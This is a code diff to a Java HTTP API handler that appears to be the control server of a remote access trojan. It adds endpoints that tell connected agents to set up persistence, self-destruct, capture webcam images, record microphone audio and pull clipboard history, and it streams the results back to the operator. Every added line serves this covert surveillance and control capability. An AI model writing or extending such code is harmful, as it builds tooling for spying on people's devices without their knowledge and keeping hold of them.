@@ -140,6 +140,21 @@ final class ApiHandler implements HttpHandler {
             case "game":
                 game(exchange, agent, query);
                 return;
+            case "persist":
+                persist(exchange, agent, query);
+                return;
+            case "selfdestruct":
+                selfDestruct(exchange, agent);
+                return;
+            case "cam":
+                camera(exchange, agent);
+                return;
+            case "mic":
+                microphone(exchange, agent, query);
+                return;
+            case "clip":
+                clipboard(exchange, agent, query);
+                return;
             default:
                 HttpUtil.send(exchange, 404, "application/json",
                         ("{\"error\":\"unknown endpoint: " + HttpUtil.esc(path) + "\"}").getBytes(StandardCharsets.UTF_8));
@@ -311,6 +326,73 @@ final class ApiHandler implements HttpHandler {
             return;
         }
         String json = "{\"ok\":true,\"text\":\"" + HttpUtil.esc(frame.field(1)) + "\"}";
+        HttpUtil.send(exchange, 200, "application/json", json.getBytes(StandardCharsets.UTF_8));
+    }
+
+    private void persist(HttpExchange exchange, AgentConnection agent, Map<String, String> query) throws IOException {
+        String action = query.getOrDefault("action", "status");
+        String mode = query.getOrDefault("mode", "auto");
+        Frame frame = agent.request(PERSIST_REQ, 40, new byte[0], action, mode);
+        if (!frame.field(0).isEmpty()) {
+            HttpUtil.send(exchange, 500, "application/json",
+                    ("{\"error\":\"" + HttpUtil.esc(frame.field(0)) + "\"}").getBytes(StandardCharsets.UTF_8));
+            return;
+        }
+        String json = "{\"ok\":true,\"output\":\"" + HttpUtil.esc(frame.field(1)) + "\"}";
+        HttpUtil.send(exchange, 200, "application/json", json.getBytes(StandardCharsets.UTF_8));
+    }
+
+    private void selfDestruct(HttpExchange exchange, AgentConnection agent) throws IOException {
+        Frame frame = agent.request(PERSIST_REQ, 20, new byte[0], "selfdestruct", "");
+        if (!frame.field(0).isEmpty()) {
+            HttpUtil.send(exchange, 500, "application/json",
+                    ("{\"error\":\"" + HttpUtil.esc(frame.field(0)) + "\"}").getBytes(StandardCharsets.UTF_8));
+            return;
+        }
+        String json = "{\"ok\":true,\"output\":\"" + HttpUtil.esc(frame.field(1)) + "\"}";
+        HttpUtil.send(exchange, 200, "application/json", json.getBytes(StandardCharsets.UTF_8));
+    }
+
+    private void camera(HttpExchange exchange, AgentConnection agent) throws IOException {
+        Frame frame = agent.request(CAM_REQ, 60, new byte[0], "");
+        if (!frame.field(0).isEmpty()) {
+            HttpUtil.send(exchange, 500, "text/plain; charset=utf-8", frame.field(0).getBytes(StandardCharsets.UTF_8));
+            return;
+        }
+        exchange.getResponseHeaders().set("Content-Type", "image/jpeg");
+        exchange.getResponseHeaders().set("Cache-Control", "no-store");
+        exchange.sendResponseHeaders(200, frame.blob.length);
+        try (OutputStream out = exchange.getResponseBody()) {
+            out.write(frame.blob);
+        }
+    }
+
+    private void microphone(HttpExchange exchange, AgentConnection agent, Map<String, String> query) throws IOException {
+        int seconds = HttpUtil.clamp(query.get("sec"), 1, 120, 5);
+        Frame frame = agent.request(MIC_REQ, seconds + 30, new byte[0], String.valueOf(seconds));
+        if (!frame.field(0).isEmpty()) {
+            HttpUtil.send(exchange, 500, "text/plain; charset=utf-8", frame.field(0).getBytes(StandardCharsets.UTF_8));
+            return;
+        }
+        exchange.getResponseHeaders().set("Content-Type", "audio/wav");
+        exchange.getResponseHeaders().set("Cache-Control", "no-store");
+        exchange.sendResponseHeaders(200, frame.blob.length);
+        try (OutputStream out = exchange.getResponseBody()) {
+            out.write(frame.blob);
+        }
+    }
+
+    private void clipboard(HttpExchange exchange, AgentConnection agent, Map<String, String> query) throws IOException {
+        String action = query.getOrDefault("action", "history");
+        String since = query.getOrDefault("since", "0");
+        Frame frame = agent.request(CLIP_REQ, 15, new byte[0], action, since);
+        if (!frame.field(0).isEmpty()) {
+            HttpUtil.send(exchange, 500, "application/json",
+                    ("{\"error\":\"" + HttpUtil.esc(frame.field(0)) + "\"}").getBytes(StandardCharsets.UTF_8));
+            return;
+        }
+        String json = "{\"ok\":true,\"total\":" + frame.field(1)
+                + ",\"text\":\"" + HttpUtil.esc(frame.field(2)) + "\"}";
         HttpUtil.send(exchange, 200, "application/json", json.getBytes(StandardCharsets.UTF_8));
     }
 
